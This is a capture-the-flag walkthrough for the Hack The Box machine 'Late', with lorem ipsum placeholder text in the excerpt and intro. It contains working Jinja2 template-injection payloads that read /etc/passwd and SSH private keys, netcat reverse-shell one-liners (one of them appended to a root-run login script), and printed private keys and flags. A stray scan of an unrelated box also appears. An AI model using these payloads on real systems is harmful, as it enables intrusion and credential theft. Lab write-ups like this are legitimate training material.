---
layout: single
title: Late - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2022-05-16
classes: wide
header:
  teaser: /assets/images/htb-writeup-late/late_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
tags:  
  - linux
  - easy
---

![](/assets/images/htb-writeup-late/late_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
<br>

----------------

# USER

### Step 1
**nmap:**
```bash
➜  late nmap -p- -v 10.10.11.156
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

➜  late nmap -p22,80 -sCV 10.10.11.156
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


[root:/git/htb/pandora]# nmap -sU --top-port=20 --open 10.10.11.136
PORT     STATE         SERVICE
67/udp   open|filtered dhcps
68/udp   open|filtered dhcpc
135/udp  open|filtered msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  open          snmp
520/udp  open|filtered route
4500/udp open|filtered nat-t-ike
```

Browsing the webpage we find `images.late.htb`, add it to `/etc/hosts` and proceed. The site is very basic and lets us upload an image which will be converted to a text document.

![[Pasted image 20220509205732.png]]
This lead me down the road of "ImageTragick" trying to inject code with the following string:
```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://nothing/here.jpg"|nc -e /bin/bash 10.10.14.18 "4488)'
pop graphic-context
```

Although it gave nothing.. so instead we look on the later part of the description ".. with flask", why do they specify that? Reading about Flask vulnerabilities we find a lot of information about Flask and Jinja, specifically Server-Side Template Injections (SSTI), where the HTB box Doctor is referenced. 

We go to HackTricks and grab all the different operations to find which template engine is being used.
```bash
## REQUEST
${7*7}
{% raw %}{{7*7}}{% endraw %}
{% raw %}{{7*'7'}}{% endraw %}
<%= 7*7 %>
#{7*7}

## RESPONSE
${7*7}
49
7777777
<%= 7*7 %>
#{7*7}
```

We see that both {% raw %}`{{7*7}}`{% endraw %} and {% raw %}`{{7*'7'}}`{% endraw %} are calculated/modified. Looking on the "SSTI chart" we can deduce it's either the template engine **Jinja2**, **Twig** or **Unknown**.

![[Pasted image 20220516210055.png]]
**Twig**: {% raw %}{{7*'7'}}{% endraw %} = 49
**Jinja2**: {% raw %}{{7*'7'}}{% endraw %} = 7777777

We've successfully detected the template engine, **Jinja2**.

-----------
### Step 2
Playing around with Jinja2 terms I tried to go with:
{% raw %}`{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}`{% endraw %}

After trying several fonts in different sizes, I finally got it to work with `Hack Regular` size 35. 

```bash
## REPLY
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
rtkit:x:111:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:113:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:114:117:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:115:119::/var/lib/saned:/usr/sbin/nologin
colord:x:116:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
pulse:x:117:121:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
geoclue:x:118:123::/var/lib/geoclue:/usr/sbin/nologin
smmta:x:119:124:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin
smmsp:x:120:125:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin
```

We find 2 users available to login:
```bash
root:x:0:0:root:/root:/bin/bash
svc_acc:x:1000:1000:Service Account:/home/svc_acc:/bin/bash
```

Looking for a ssh private key we find `/home/svc_acc/.ssh/id_rsa`.
```bash
## REQUEST
{% raw %}{{get_flashed_messages.__globals__.__builtins__.open("/home/svc_acc/.ssh/id_rsa").read()}}{% endraw %}

## RESPONSE
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
```

Login and grab ``user.txt``:
```bash
➜  late ssh svc_acc@10.10.11.156 -i svc_acc-id_rsa 
svc_acc@late:~$ id && hostname
uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)
late
svc_acc@late:~$ cat user.txt 
90faa22275cce13d448e927941c55eff
```

-------
# Root

### Step 1
- `sudo -l` requires password, so that's a no-go.

Lets look if there's any service or commands running regularly that we can hijack, using `pspy64`. 
```bash
svc_acc@late:/dev/shm$ ./pspy64
[... snip ...]

2022/05/16 20:10:01 CMD: UID=0    PID=3412   | cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh 
2022/05/16 20:10:01 CMD: UID=0    PID=3414   | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh 
2022/05/16 20:10:01 CMD: UID=0    PID=3416   | rm -r /home/svc_acc/app/misc/* 
2022/05/16 20:11:01 CMD: UID=0    PID=3420   | /bin/bash /root/scripts/cron.sh 
2022/05/16 20:11:01 CMD: UID=0    PID=3419   | /bin/sh -c /root/scripts/cron.sh 
2022/05/16 20:11:01 CMD: UID=0    PID=3418   | /usr/sbin/CRON -f 
2022/05/16 20:12:01 CMD: UID=0    PID=3432   | /bin/bash /root/scripts/cron.sh 
2022/05/16 20:12:01 CMD: UID=0    PID=3431   | /bin/sh -c /root/scripts/cron.sh 
2022/05/16 20:12:01 CMD: UID=0    PID=3429   | /usr/sbin/CRON -f 
2022/05/16 20:12:01 CMD: UID=0    PID=3436   | chmod +x /usr/local/sbin/ssh-alert.sh 
2022/05/16 20:12:01 CMD: UID=0    PID=3437   | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh 
2022/05/16 20:13:01 CMD: UID=0    PID=3443   | /bin/bash /root/scripts/cron.sh 
2022/05/16 20:13:01 CMD: UID=0    PID=3442   | /bin/sh -c /root/scripts/cron.sh 
2022/05/16 20:13:01 CMD: UID=0    PID=3441   | /usr/sbin/CRON -f 
2022/05/16 20:14:01 CMD: UID=0    PID=3454   | /bin/bash /root/scripts/cron.sh 
2022/05/16 20:14:01 CMD: UID=0    PID=3453   | /bin/sh -c /root/scripts/cron.sh 
2022/05/16 20:14:01 CMD: UID=0    PID=3452   | /usr/sbin/CRON -f 
2022/05/16 20:15:01 CMD: UID=0    PID=3465   | /bin/bash /root/scripts/cron.sh 
2022/05/16 20:15:01 CMD: UID=0    PID=3464   | /bin/sh -c /root/scripts/cron.sh 
2022/05/16 20:15:01 CMD: UID=0    PID=3463   | /usr/sbin/CRON -f 
2022/05/16 20:15:01 CMD: UID=0    PID=3466   | /bin/bash /root/scripts/cron.sh 
2022/05/16 20:15:01 CMD: UID=0    PID=3468   | cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh 
2022/05/16 20:15:01 CMD: UID=0    PID=3470   | /bin/bash /root/scripts/cron.sh 
2022/05/16 20:16:01 CMD: UID=0    PID=3476   | /bin/bash /root/scripts/cron.sh 
2022/05/16 20:16:01 CMD: UID=0    PID=3475   | /bin/sh -c /root/scripts/cron.sh 
2022/05/16 20:16:01 CMD: UID=0    PID=3474   | /usr/sbin/CRON -f 
2022/05/16 20:16:01 CMD: UID=???  PID=3479   | ???
2022/05/16 20:16:01 CMD: UID=0    PID=3481   | 
2022/05/16 20:16:01 CMD: UID=0    PID=3482   | rm -r /home/svc_acc/app/uploads/* 
```

The script `/usr/local/sbin/ssh-alert.sh` is running on login, however it's write protected:
```bash
svc_acc@late:~$ ls -al /usr/local/sbin/ssh-alert.sh
-rwxr-xr-x 1 svc_acc svc_acc 433 May 16 20:33 /usr/local/sbin/ssh-alert.sh
```

HOWEVER, looking on the file attributes we find that we can append to the file (indicated by the 'a'-flag):
```bash
svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
-----a--------e--- /usr/local/sbin/ssh-alert.sh
```

```bash
svc_acc@late:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 4488 >/tmp/f" >> /usr/local/sbin/ssh-alert.sh
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.26 4488 >/tmp/f
```

Log out and in again to trigger the `ssh-alert`-script and grab `root.txt`:
```bash
➜  late nc -lvnp 4488                             
listening on [any] 4488 ...
connect to [10.10.14.26] from (UNKNOWN) [10.10.11.156] 49522
/bin/sh: 0: can't access tty; job control turned off
# id && hostname
uid=0(root) gid=0(root) groups=0(root)
late
# cat /root/root.txt
38007fc077ae764169e09ba12c574fa7
# cat /root/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEoQIBAAKCAQEAuDUCfyBofVqk+Qilst0xDnhScDu+kSmXHYBcL1iwxajW5SWp
oGqD39nBh/AzQYcQk4t5xIV8eUlda0zD1pjfPYAOHt9efDSxWaJQ91P5L+qlsCii
efP8M0zlWgN8nzII9MSrRSU7I7iVYaYLawl82JhnoTSt1CoexSDT0T23DPOr2KC/
8XBlIFgZN/pyri0qtG3n3r1lRBQFj1eDMwd2AeeOL+AQUz7b7v5xqErTNvRjC2Yf
xqmIEaqgvTWsxZL2oCJbv9pJ3+ApGaxLJyZgvXMI39ubndiatITMiGbwE61kMV+D
r8d8LKpHBRBTKOzo9VV8dHFhN9KYAFKbAatpKwIDAQABAoIBAGnHdxGNiLNDVCz1
vEFEJ6GJkr2EcWBmo7J7PXSq14gJ9q1LvWazA9uN7kajtqtQZkJz+47QoLP9Xzn4
sRUQYFGusW0lE9r7X0R7o0cD37qWYmMQUoz5gL/szl+sVOoOD3qPXVKtmJJgsteK
RFBI+HpgulGmMJP/RAArY7dqWy2B3XniUWZY+IjOdHYBQSNFbc6kYrwDcpYn1rHt
fwq55t7nyXho25paTbmwRBhBwNA4fK/Kzkbct4bvx1GRxdctqa4NbvoPVTNJ0tnY
7kFn4V6rBV8LiZP9tI5eLWNh+yid7Sca2TgUqQdfcFePD6GnW9qydgTs32fAwbsL
nqNHH1ECgYEA73dBhgBnvvkSDRUBjJV94q+jeE+7oh2WOOCcMAtu4vQ6Z6ZA1im6
c0bETk3FyNTtrIq+NxqqXvDz15u5IferwPT5jYyi6/5g2wfmrt0K9qYmCk0g/TFJ
ab6Zbz57eVzjZnZLSsaCyPsJqRGMAb+kPmszhseeXp82cwLmH0BBfCcCgYEAxO0D
IJPrqjyA/O/f95okskHqW0/kstPQCMazsxf4qtQ4G0j/UTbE054T+nRJvnEJd+68
MWsmXechRKASK8FZcVBJMPlJB9qetCXanZDnthHUOZ4ASMyWGUY5GnqdiD8WWyI+
WpqQ3YEaXhj2C507yS1RsZnr1iUvt+ic6xqimV0CgYBbJnfIfAsBhGk8lYxbaOPc
D6MXvrHbSYvO5qBNIWz58qDwpzXyzztrebprW+s3QOWfUciJzRqgvPL0VRApP88e
yaDcInY5gkB33xAN65GqxR+huC4gckxRdf2NfKkfTx43+Ds8oUdTHUtWEZnLaJkq
MUARw5YiylO9f5L8vkau7QJ/BuxOL9cDcfiukDXeqdXBdILculkUsTTBG43gw2sU
Uu0jC9KFJ1XFlar5CNUNwqQ2sQCznQknUCXQBZmbCe7CNjmcWRxqdNw6uBqclO2D
N+Nokp37ZJPMsxbE6ylkYGXXY1zQ1F6auS7Qvn4iKEZe07PEK3o90El+Y/jJi3pk
PQKBgQC0AIdrkyGdIiPSHJHmiOpGyE85Hl8McQZoTwAlacTm9HYiQycQoraFwAmK
yHYDDSiJznWLqU58gdLybuTU4eWkWd/NaPOSrrUpHdIWTS8+nWJiu1BPowKaGMdP
9WnDQAEXbK24DiX2WGioLX11x3Qn/W+Y9ZCrYYC1mKjOAbIJsQ==
-----END RSA PRIVATE KEY-----
```

## References
SSTI: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
